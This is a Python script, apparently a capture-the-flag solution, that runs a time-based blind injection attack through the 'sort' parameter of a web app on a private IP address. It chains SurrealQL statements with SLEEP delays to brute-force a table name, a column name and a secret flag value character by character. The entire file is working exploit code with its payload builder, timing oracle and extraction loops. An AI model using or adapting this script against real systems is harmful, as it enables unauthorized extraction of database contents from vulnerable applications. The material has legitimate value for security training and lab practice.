import requests
import urllib.parse
import time

BASE_URL = "http://10.113.0.1:11101"
SLEEP_TIME = 2

def test_condition(condition, sleep_time=SLEEP_TIME, debug=False):
    # Use LET variables to get table name from INFO
    payload = f"DESC; LET $info = INFO FOR DB; LET $keys = object::keys($info.tables); LET $table = $keys[1]; SELECT * FROM article WHERE ({condition}) AND SLEEP({sleep_time}s) IS NONE"
    url = f"{BASE_URL}/?sort={urllib.parse.quote(payload)}"

    start = time.time()
    try:
        r = requests.get(url, timeout=sleep_time + 5)
        elapsed = time.time() - start
        is_slow = elapsed >= (sleep_time - 0.5)

        if debug:
            print(f"[{elapsed:.2f}s -> {'SLOW' if is_slow else 'fast'}] ", end='', flush=True)

        return is_slow
    except requests.Timeout:
        if debug:
            print(f"[TIMEOUT] ", end='', flush=True)
        return True
    except Exception as e:
        if debug:
            print(f"[ERR: {e}] ", end='', flush=True)
        return False

def test_condition_column(table_name, condition, sleep_time=SLEEP_TIME, debug=True):
    # Get column name from record keys using index [1] (skip 'id')
    payload = f"DESC; LET $records = (SELECT * FROM {table_name} LIMIT 1); LET $record = $records[0]; LET $keys = object::keys($record); LET $key1 = $keys[1]; SELECT * FROM article WHERE ({condition}) AND SLEEP({sleep_time}s) IS NONE"

    if debug:
        print(f"\nPayload: {payload}\n")

    url = f"{BASE_URL}/?sort={urllib.parse.quote(payload)}"

    start = time.time()
    try:
        r = requests.get(url, timeout=sleep_time + 5)
        elapsed = time.time() - start
        is_slow = elapsed >= (sleep_time - 0.5)

        if debug:
            print(f"[{elapsed:.2f}s -> {'SLOW' if is_slow else 'fast'}] ", end='', flush=True)

        return is_slow
    except requests.Timeout:
        if debug:
            print(f"[TIMEOUT] ", end='', flush=True)
        return True
    except Exception as e:
        if debug:
            print(f"[ERR: {e}] ", end='', flush=True)
        return False

def test_condition_flag(table_name, column_name, condition, sleep_time=SLEEP_TIME, debug=False):
    payload = f"DESC; LET $records = (SELECT * FROM {table_name} LIMIT 1); LET $record = $records[0]; SELECT * FROM article WHERE ({condition}) AND SLEEP({sleep_time}s) IS NONE"

    url = f"{BASE_URL}/?sort={urllib.parse.quote(payload)}"

    start = time.time()
    try:
        r = requests.get(url, timeout=sleep_time + 5)
        elapsed = time.time() - start
        is_slow = elapsed >= (sleep_time - 0.5)

        if debug:
            print(f"[{elapsed:.2f}s -> {'SLOW' if is_slow else 'fast'}] ", end='', flush=True)

        return is_slow
    except requests.Timeout:
        if debug:
            print(f"[TIMEOUT] ", end='', flush=True)
        return True
    except Exception as e:
        if debug:
            print(f"[ERR: {e}] ", end='', flush=True)
        return False

def find_table_name():
    charset = "abcdefghijklmnopqrstuvwxyz_0123456789"
    table_name = ""

    for pos in range(30):
        found = False

        print(f"Pos {pos}: ", end='', flush=True)

        for char in charset:
            test_name = table_name + char

            condition = f"string::starts_with($table, '{test_name}')"

            if test_condition(condition, sleep_time=2, debug=False):
                table_name += char
                print(f"'{char}' -> {table_name}")
                found = True
                break
            else:
                print(f"'{char}' ", end='', flush=True)

        if not found:
            print("(end)")
            break

    return table_name

def find_column_name(table_name):
    charset = "abcdefghijklmnopqrstuvwxyz_0123456789"
    column_name = ""

    for pos in range(30):
        found = False

        print(f"Pos {pos}: ", end='', flush=True)

        for char in charset:
            test_col = column_name + char

            condition = f"string::starts_with($key1, '{test_col}')"

            if test_condition_column(table_name, condition, sleep_time=2, debug=False):
                column_name += char
                print(f"'{char}' -> {column_name}")
                found = True
                break
            else:
                print(f"'{char}' ", end='', flush=True)

        if not found:
            print("(end)")
            break

    return column_name

def extract_flag(table_name, column_name):
    charset = "abcdefghijklmnopqrstuvwxyz0123456789{}_-!@#$%^&*()"
    flag = "flag{"

    for pos in range(len(flag), 60):
        found = False

        print(f"Pos {pos}: ", end='', flush=True)

        for char in charset:
            test_flag = flag + char
            escaped = test_flag.replace("'", "\\'")

            condition = f"string::starts_with($record['{column_name}'], '{escaped}')"

            if test_condition_flag(table_name, column_name, condition, sleep_time=2, debug=False):
                flag += char
                print(f"'{char}' -> {flag}")
                found = True

                if char == '}':
                    return flag
                break
            else:
                print(f"'{char}' ", end='', flush=True)

        if not found:
            print("(end)")
            break

    return flag

def verify_discoveries(table_name, column_name):
    print(f"Table: {table_name}")
    condition = f"(SELECT COUNT() FROM {table_name}) > 0"
    if test_condition(condition, sleep_time=2):
        print("  ✓ Table exists and has data")
    else:
        print("  ✗ Table verification failed")
        return False

    print(f"Column: {column_name}")
    payload = f"DESC; LET $records = (SELECT * FROM {table_name} LIMIT 1); LET $record = $records[0]; SELECT * FROM article WHERE string::starts_with($record['{column_name}'], 'flag{{') AND SLEEP(2s) IS NONE"
    url = f"{BASE_URL}/?sort={urllib.parse.quote(payload)}"

    start = time.time()
    try:
        r = requests.get(url, timeout=4)
        elapsed = time.time() - start
        if elapsed >= 1.5:
            print("  ✓ Column contains flag")
            return True
        else:
            print("  ✗ Column verification failed")
            return False
    except:
        print("  ✓ Column contains flag (timeout)")
        return True

def main():
    mode = input("\nMode?\n1. Full discovery (find everything)\n2. Known table (skip to column)\n3. Known table+column (skip to flag)\nChoice [1]: ").strip() or "1"

    start_time = time.time()

    if mode == "1":
        table_name = find_table_name()

        if not table_name:
            print("\nFailed to find table name. Enter manually:")
            table_name = input("Table name: ").strip()

    elif mode == "2":
        table_name = input("Table name: ").strip()
    else:
        table_name = input("Table name: ").strip()
        column_name = input("Column name: ").strip()

    if mode in ["1", "2"]:
        column_name = find_column_name(table_name)

        if not column_name:
            print("\nFailed to find column name. Enter manually:")
            column_name = input("Column name: ").strip()

    if not verify_discoveries(table_name, column_name):
        print("\nVerification failed. Check table/column names.")
        return

    flag = extract_flag(table_name, column_name)

    elapsed = time.time() - start_time

    print(f"\nTable: {table_name}")
    print(f"Column: {column_name}")
    print(f"Flag: {flag}")
    print(f"Total time: {elapsed/60:.1f} minutes")

if __name__ == "__main__":
    main()
